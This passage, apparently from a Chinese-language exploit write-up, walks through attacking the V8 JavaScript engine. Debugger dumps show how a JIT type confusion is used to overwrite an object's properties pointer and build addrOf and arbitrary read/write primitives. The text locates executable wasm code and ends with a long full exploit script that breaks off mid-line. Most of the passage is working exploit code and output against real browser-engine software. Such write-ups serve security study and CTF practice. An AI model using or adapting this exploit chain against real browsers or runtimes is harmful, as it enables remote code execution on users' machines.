+ - instance descriptors (own) #2: 0x2d853bb1cf29 &lt;FixedArray[8]&gt;
+ - layout descriptor: 0x100000000
+ - prototype: 0x2422aa4046a9 &lt;Object map = 0xbc7d55022a1&gt;
+ - constructor: 0x2422aa4046e1 &lt;JSFunction Object (sfi = 0x3d6274323b59)&gt;
+ - dependent code: 0x2422aa43a4c1 &lt;FixedArray[4]&gt;
+ - construction counter: 0
+</code></pre><p>添加的<code>o.d</code>(<code>properties[0]</code>)是<code>MutableNumber</code>类型。</p>
+<pre><code>pwndbg&gt; job 0x3e5206a41ce9
+&lt;mutable 2.2&gt;
+pwndbg&gt; x/2gx 0x3e5206a41ce9-1
+0x3e5206a41ce8:    0x00000aefc6902e31    0x400199999999999a
+</code></pre><p>改变<code>o.d</code>后</p>
+<pre><code>DebugPrint: 0x3e5206a41ca1: [JS_OBJECT_TYPE]
+ - map = 0xbc7d550b081 [FastProperties]
+ - prototype = 0x2422aa4046a9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x3e5206a41d99 &lt;PropertyArray[3]&gt; {
+    #c: &lt;unboxed double&gt; 1.1 (data field 0)
+    #d: 0x2d853bb1cac1 &lt;Object map = 0xbc7d550b6c1&gt; (data field 1) properties[0]
+ }
+0xbc7d550b081: [Map]
+ - type: JS_OBJECT_TYPE
+ - instance size: 32
+ - inobject properties: 1
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 2
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0xbc7d550b711 &lt;Map(HOLEY_ELEMENTS)&gt;
+ - instance descriptors (own) #2: 0x3e5206a41d49 &lt;FixedArray[8]&gt;
+ - layout descriptor: 0x100000000
+ - prototype: 0x2422aa4046a9 &lt;Object map = 0xbc7d55022a1&gt;
+ - constructor: 0x2422aa4046e1 &lt;JSFunction Object (sfi = 0x3d6274323b59)&gt;
+ - dependent code: 0x3d6274302251 &lt;FixedArray[0]&gt;
+ - construction counter: 0
+ ...
+ pwndbg&gt; job 0x2d853bb1cac1
+0x2d853bb1cac1: [JS_OBJECT_TYPE]
+ - map = 0xbc7d550b6c1 [FastProperties]
+ - prototype = 0x2422aa4046a9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x2d853bb1cba1 &lt;PropertyArray[3]&gt; {
+    #inline: 42 (data field 0)
+    #offset0: 0x2d853bb1cb19 &lt;Object map = 0xbc7d5502391&gt; (data field 1) properties[0]
+    #offset8: 0x2d853bb1cbc9 &lt;Object map = 0xbc7d5502391&gt; (data field 2) properties[1]
+    #offset16: 0x2d853bb1cc69 &lt;Object map = 0xbc7d5502391&gt; (data field 3) properties[2]
+ }
+ pwndbg&gt; x/2gx  0x2d853bb1cac1-1
+0x2d853bb1cac0:    0x00000bc7d550b6c1    0x00002d853bb1cba1
+</code></pre><p><code>0x2d853bb1cac1</code>的对象就是我们要改变<code>properties</code>的对象。<br>可以看到存放对象<code>properties</code>的位置与存放<code>MutableNumber</code>的值的位置相同，<br>所以我们可以再次修改o.d为目标值，就可以修改对象<code>0x2d853bb1cac1</code>的<code>properties</code>为目标值。</p>
+<pre><code>DebugPrint: 0x2d853bb1cac1: [JS_OBJECT_TYPE]
+ - map = 0xbc7d550b6c1 [FastProperties]
+ - prototype = 0x2422aa4046a9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x2422aa436749 &lt;ArrayBuffer map = 0xbc7d5502f71&gt; {
+    #inline: 42 (data field 0)
+    #offset0: 0x3d6274302251 &lt;FixedArray[0]&gt; (data field 1) properties[0]
+    #offset8: 1024 (data field 2) properties[1]
+    #offset16: 22089 (data field 3) properties[2]
+ ...
+pwndbg&gt; job 0x2422aa436749
+0x2422aa436749: [JSArrayBuffer] in OldSpace
+ - map = 0xbc7d5502f71 [FastProperties]
+ - prototype = 0x2422aa40b7b9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store = 0x56494f218ea0
+ - byte_length = 1024
+ - neuterable
+ - properties = 0x3d6274302251 &lt;FixedArray[0]&gt; {}
+ - embedder fields = {
+    (nil)
+    (nil)
+ }
+</code></pre><p>此时对象<code>0x2d853bb1cac1</code>的<code>properties</code>已经被修改为了一个<code>ArrayBuffer</code>的地址。</p>
+<h2 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> memviewBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">var</span> driverBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br></pre></td></tr></table></figure>
+<p>首先<code>new</code>两个<code>ArrayBuffer</code>，并通过两次<code>gc</code>把他们移到<code>OldSpace</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> victim = &#123;<span class="attr">inline</span>: <span class="number">42</span>&#125;;</span><br><span class="line">victim.offset0  = &#123;&#125;;</span><br><span class="line">victim.offset8  = &#123;&#125;;</span><br><span class="line">victim.offset16 = &#123;&#125;;</span><br></pre></td></tr></table></figure>
+<p>然后通过上述修改<code>properties</code>的方法，把<code>victim</code>的<code>properties</code>修改为<code>driverBuf</code>的地址(通过<code>AddrOf</code>获得)。<br>看一下<code>PropertyArray</code></p>
+<pre><code>pwndbg&gt; job 0x2d853bb1cba1
+0x2d853bb1cba1: [PropertyArray]
+ - map = 0xaefc69031a1 &lt;Map(HOLEY_ELEMENTS)&gt;
+ - length: 3
+ - hash: 0
+           0: 0x2d853bb1cb19 &lt;Object map = 0xbc7d5502391&gt;
+           1: 0x2d853bb1cbc9 &lt;Object map = 0xbc7d5502391&gt;
+           2: 0x2d853bb1cc69 &lt;Object map = 0xbc7d5502391&gt;
+pwndbg&gt; x/6gx 0x2d853bb1cba1-1
+0x2d853bb1cba0:    0x00000aefc69031a1    0x0000000300000000
+0x2d853bb1cbb0:    0x00002d853bb1cb19    0x00002d853bb1cbc9
+0x2d853bb1cbc0:    0x00002d853bb1cc69    0x00000bc7d5502391
+</code></pre><p>可以看到<code>0x20</code>位置是<code>0x00002d853bb1cc69</code>，即<code>victim.offset16</code>。</p>
+<pre><code>pwndbg&gt; job 0x2422aa436749
+0x2422aa436749: [JSArrayBuffer] in OldSpace
+ - map = 0xbc7d5502f71 [FastProperties]
+ - prototype = 0x2422aa40b7b9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store = 0x56494f218ea0
+ - byte_length = 1024
+ - neuterable
+ - properties = 0x3d6274302251 &lt;FixedArray[0]&gt; {}
+ - embedder fields = {
+    (nil)
+    (nil)
+ }
+pwndbg&gt; x/6gx 0x2422aa436749-1
+0x2422aa436748:    0x00000bc7d5502f71    0x00003d6274302251
+0x2422aa436758:    0x00003d6274302251    0x0000040000000000
+0x2422aa436768:    0x000056494f218ea0    0x000056494f218ea0
+</code></pre><p>而在<code>ArrayBuffer</code>中，<code>0x20</code>位置是<code>backing_store</code>。所以我们可以修改<code>victim.offset16</code>来改变<code>backing_store</code>。</p>
+<pre><code>DebugPrint: 0x2d853bb1cac1: [JS_OBJECT_TYPE]
+ - map = 0xbc7d550b6c1 [FastProperties]
+ - prototype = 0x2422aa4046a9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - properties = 0x2422aa436749 &lt;ArrayBuffer map = 0xbc7d5502f71&gt; {
+    #inline: 42 (data field 0)
+    #offset0: 0x3d6274302251 &lt;FixedArray[0]&gt; (data field 1) properties[0]
+    #offset8: 1024 (data field 2) properties[1]
+    #offset16: 0x2422aa408f31 &lt;ArrayBuffer map = 0xbc7d5502f71&gt; (data field 3) properties[2]
+ }
+ 0x2422aa436749: [JSArrayBuffer] in OldSpace
+ - map = 0xbc7d5502f71 [FastProperties]
+ - prototype = 0x2422aa40b7b9
+ - elements = 0x3d6274302251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store = 0x2422aa408f31
+ - byte_length = 1024
+ - neuterable
+ - properties = 0x3d6274302251 &lt;FixedArray[0]&gt; {}
+ - embedder fields = {
+    (nil)
+    (nil)
+ }
+</code></pre><p>通过修改后可以看到，随着<code>offset16</code>的改变，<code>ArrayBuffer</code>的<code>backing_store</code>同时改变。<br>然后就可以通过其获得完整的任意地址读写。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArbitraryRW</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	read(addr)</span><br><span class="line">	&#123;</span><br><span class="line">		driver.setFloat64(<span class="number">31</span>, tC.u2f(addr), <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">var</span> memView = <span class="keyword">new</span> <span class="built_in">DataView</span>(memviewBuf);</span><br><span class="line">		<span class="keyword">return</span> tC.f2u(memView.getFloat64(<span class="number">0</span>,<span class="literal">true</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	write(addr, payload)</span><br><span class="line">	&#123;</span><br><span class="line">		driver.setFloat64(<span class="number">31</span>, tC.u2f(addr), <span class="literal">true</span>);</span><br><span class="line">		<span class="keyword">var</span> memView = <span class="keyword">new</span> <span class="built_in">DataView</span>(memviewBuf);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;payload.length; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			memView.setUint8(i, payload[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	leakObjF(objInput)</span><br><span class="line">	&#123;</span><br><span class="line">		driverBuf.leakobj = objInput;</span><br><span class="line">		<span class="comment">//%DebugPrint(objInput);</span></span><br><span class="line">		<span class="comment">//%DebugPrint(driverBuf);</span></span><br><span class="line">		<span class="comment">//%SystemBreak();</span></span><br><span class="line">		<span class="keyword">let</span> propertiesAddr = <span class="keyword">this</span>.read(bufAddr - <span class="number">0x1</span> + <span class="number">0x8</span>);</span><br><span class="line">		<span class="keyword">let</span> objAddr = <span class="keyword">this</span>.read(propertiesAddr - <span class="number">0x1</span> + <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> objAddr;</span><br><span class="line">	&#125;</span><br><span class="line">	leakObj(obj)</span><br><span class="line">	&#123;</span><br><span class="line">		driverBuf.leakobj = obj;</span><br><span class="line">		<span class="keyword">let</span> mapAddr = <span class="keyword">this</span>.read(bufAddr<span class="number">-1</span>);</span><br><span class="line">		<span class="keyword">let</span> instanceDescriptorsAddr = <span class="keyword">this</span>.read(mapAddr - <span class="number">0x1</span> + <span class="number">0x30</span>);</span><br><span class="line">		<span class="keyword">let</span> objAddr = <span class="keyword">this</span>.read(instanceDescriptorsAddr - <span class="number">0x1</span> + <span class="number">0x30</span>);</span><br><span class="line">		<span class="keyword">return</span> objAddr;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>
+<p><code>read</code>中，<code>driver</code>是上面<code>victim</code>的<code>properties</code>所指<code>ArrayBuffer</code>的视图，其<code>backing_store</code>已经被修改成另一个<code>ArrayBuffer</code>，向<code>backing_store</code>内容<code>+31</code>偏移位置(即另一个<code>ArrayBuffer</code>的<code>backing_store</code>)写入目标<code>addr</code>，然后通过另一个<code>ArrayBuffer</code>的视图控制读写。<br><code>write</code>中也类似。<br><code>leakObj</code>是通过<code>map</code>以及<code>instanceDescriptors</code>来稳定泄露<code>obj</code>的地址。</p>
+<h2 id="RWX地址"><a href="#RWX地址" class="headerlink" title="RWX地址"></a>RWX地址</h2><p>在低版本的<code>v8</code>中，可以通过修改函数的<code>JIT</code>代码实现任意执行。</p>
+<pre><code>pwndbg&gt; job 0x246bc89ac0c1
+0x246bc89ac0c1: [Function] in OldSpace
+ - map = 0x284ab4a84501 [FastProperties]
+ - prototype = 0x246bc8984669
+ - elements = 0x2d96f9082251 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
+ - initial_map = 
+ - shared_info = 0x246bc89abf81 &lt;SharedFunctionInfo 0&gt;
+ - name = 0x2d96f90844f1 &lt;String[1]: 0&gt;
+ - formal_parameter_count = 0
+ - kind = [ NormalFunction ]
+ - context = 0x246bc8983d91 &lt;FixedArray[281]&gt;
+ - code = 0x257698804081 &lt;Code JS_TO_WASM_FUNCTION&gt;
+ - properties = 0x246bc8988d81 &lt;PropertyArray[3]&gt; {
+    #length: 0x2d96f90fdb19 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #name: 0x2d96f90fdb89 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #arguments: 0x2d96f90fdbf9 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #caller: 0x2d96f90fdc69 &lt;AccessorInfo&gt; (const accessor descriptor)
+    #prototype: 0x2d96f90fdcd9 &lt;AccessorInfo&gt; (const accessor descriptor)
+    0x2d96f9084991 &lt;Symbol: (wasm_instance_symbol)&gt;: 0x246bc89ae669 &lt;Instance map = 0x38c99150b7b1&gt; (data field 0) properties[0]
+    0x2d96f9084971 &lt;Symbol: (wasm_function_index_symbol)&gt;: 0 (data field 1) properties[1]
+ }
+
+ - feedback vector: not available
+pwndbg&gt; x/20gx 0x246bc89ac0c1-1
+0x246bc89ac0c0:    0x0000284ab4a84501    0x0000246bc8988d81
+0x246bc89ac0d0:    0x00002d96f9082251    0x00002d96f9082321
+0x246bc89ac0e0:    0x0000246bc89abf81    0x0000246bc8983d91
+0x246bc89ac0f0:    0x00002d96f90827e1    0x0000257698804081 
+</code></pre><p><code>code</code>在0x38偏移处。</p>
+<pre><code>pwndbg&gt; job 0x257698804081
+0x257698804081: [Code]
+kind = JS_TO_WASM_FUNCTION
+compiler = turbofan
+Instructions (size = 147)
+0x2576988040e0     0  55             push rbp
+0x2576988040e1     1  4889e5         REX.W movq rbp,rsp
+</code></pre><p>可计算得到，<code>code</code>地址距离可执行代码的位置有<code>0x60</code>的偏移。</p>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">'0x'</span> + (x.toString(<span class="number">16</span>)).padStart(<span class="number">16</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">str, val</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[+] "</span> + str + <span class="string">" -&gt; "</span>+ hex(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) </span><br><span class="line">	&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">typeConvert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()&#123;</span><br><span class="line">        <span class="keyword">this</span>.buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">        <span class="keyword">this</span>.f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.u32 = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2u(val)&#123;        <span class="comment">//double ==&gt; Uint64</span></span><br><span class="line">        <span class="keyword">this</span>.f64[<span class="number">0</span>] = val;</span><br><span class="line">        <span class="keyword">let</span> tmp = <span class="built_in">Array</span>.from(<span class="keyword">this</span>.u32);</span><br><span class="line">        <span class="keyword">return</span> tmp[<span class="number">1</span>] * <span class="number">0x100000000</span> + tmp[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    u2f(val)&#123;        <span class="comment">//Uint64 ==&gt; double</span></span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = <span class="built_in">parseInt</span>(val % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = <span class="built_in">parseInt</span>((val - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.u32.set(tmp);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> tC = <span class="keyword">new</span> typeConvert();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> wasmFunc = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrOf</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> o = &#123;<span class="attr">a</span>: <span class="number">1.1</span>, <span class="attr">b</span>: <span class="number">2.2</span>&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">triggerFunc</span>(<span class="params">o, callback</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp = o.a;</span><br><span class="line">		callback(tmp);</span><br><span class="line">		<span class="keyword">return</span> o.b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">usableFunc</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		o.b = obj;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		triggerFunc(o,()=&gt;<span class="number">1</span>);</span><br><span class="line">		triggerFunc(o,()=&gt;<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">let</span> ret = tC.f2u(triggerFunc(o,usableFunc));</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">changeProperties</span>(<span class="params">target, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params">o, callback0</span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">let</span> tmp = o.c;</span><br><span class="line">		callback0(tmp);</span><br><span class="line">		o.d = value;</span><br><span class="line">		<span class="keyword">return</span> o.d;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> o = &#123;</span><br><span class="line">		c : <span class="number">1.1</span></span><br><span class="line">	&#125;;</span><br><span class="line">	o.d = <span class="number">2.2</span>;</span><br><span class="line">	<span class="comment">//%DebugPrint(o); </span></span><br><span class="line">	<span class="comment">//%SystemBreak();</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>; i&lt;<span class="number">0x12000</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		func(o,()=&gt;<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">var</span> o = &#123;</span><br><span class="line">		c : <span class="number">1.1</span></span><br><span class="line">	&#125;;</span><br><span class="line">	o.d = <span class="number">2.2</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">var</span> res = func(o,<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">			<span class="comment">//%DebugPrint(o);</span></span><br><span class="line">			<span class="comment">//%SystemBreak();</span></span><br><span class="line">			o.d = target;</span><br><span class="line">			<span class="comment">//%DebugPrint(o);</span></span><br><span class="line">			<span class="comment">//%DebugPrint(target);</span></span><br><span class="line">			<span class="comment">//%SystemBreak();</span></span><br><span class="line">			&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> memviewBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span>);</span><br><span class="line"><span class="keyword">var</span> driverBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">1024</span>);</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(driverBuf);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"><span class="keyword">var</span> bufAddr = addrOf(driverBuf);</span><br><span class="line"><span class="keyword">var</span> victim = &#123;<span class="attr">inline</span>: <span class="number">42</span>&#125;;</span><br><span class="line">victim.offset0  = &#123;&#125;;</span><br><span class="line">victim.offset8  = &#123;&#125;;</span><br><span class="line">victim.offset16 = &#123;&#125;;</span><br><span class="line"><span class="comment">//%DebugPrint(victim);</span></span><br><span class="line"></span><br><span class="line">changeProperties(victim, tC.u2f(bufAddr));</span><br><span class="line"><span class="comment">//%DebugPrint(victim);</span></span><br><span class="line"><span 